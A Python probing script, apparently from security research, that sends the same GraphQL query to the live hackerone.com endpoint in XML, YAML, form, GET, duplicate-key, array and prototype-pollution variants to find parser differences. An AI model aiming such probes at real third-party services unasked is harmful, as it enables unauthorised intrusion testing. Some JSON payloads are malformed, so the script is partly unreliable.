# -*- coding: utf-8 -*-
"""CF5 组:GraphQL 传输层解析器差异矩阵(匿名)(2026-09-08)"""
import urllib.request

BASE = "https://hackerone.com/graphql"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
Q = '{ search(index: CompleteHacktivityReportIndex, query_string: "*:*", first: 1){ total_count } }'


def send(label, body, ctype, method="POST"):
    req = urllib.request.Request(BASE, data=body, headers=dict(UA, **{"Content-Type": ctype}), method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            resp = r.read().decode("utf-8", "replace")
        print(f"===== {label}\nHTTP 200 {resp[:600]}\n")
    except urllib.error.HTTPError as e:
        print(f"===== {label}\nHTTP {e.code} {e.read().decode('utf-8', 'replace')[:400]}\n")
    except Exception as e:
        print(f"===== {label} ERR {e}\n")


# 1. XML params(旧 Rails XML 解析——YAML 类型转换家族)
send("CF5a_xml", b'<?xml version="1.0"?><query>' + Q.encode() + b'</query>', "application/xml")
# 2. YAML
send("CF5b_yaml", ("---\nquery: " + Q + "\n").encode(), "text/yaml")
# 3. 表单
send("CF5c_form", ("query=" + urllib.parse.quote(Q)).encode(), "application/x-www-form-urlencoded")
# 4. GET 带 query
send("CF5d_get", None, None, method="GET")
try:
    req = urllib.request.Request(BASE + "?query=" + urllib.parse.quote(Q), headers=UA, method="GET")
    with urllib.request.urlopen(req, timeout=25) as r:
        print("===== CF5d_get_q\nHTTP 200", r.read().decode("utf-8", "replace")[:600], "\n")
except urllib.error.HTTPError as e:
    print(f"===== CF5d_get_q\nHTTP {e.code} {e.read().decode('utf-8', 'replace')[:400]}\n")
except Exception as e:
    print(f"===== CF5d_get_q ERR {e}\n")
# 5. JSON 重复键(手工构造——后者应胜)
send("CF5e_dupkey", b'{"query":"{ badfield }","query":' + Q.encode() + b'}', "application/json")
# 6. body 形态:数组/字符串/数字
send("CF5f_array", b'[{"query": ' + Q.encode() + b'}]', "application/json")
send("CF5g_str", Q.encode(), "application/json")
# 7. JSON 里 __proto__/constructor(原型污染探测——看解析器行为)
send("CF5h_proto", b'{"__proto__":{"query":' + Q.encode() + b'},"query":' + Q.encode() + b'}', "application/json")
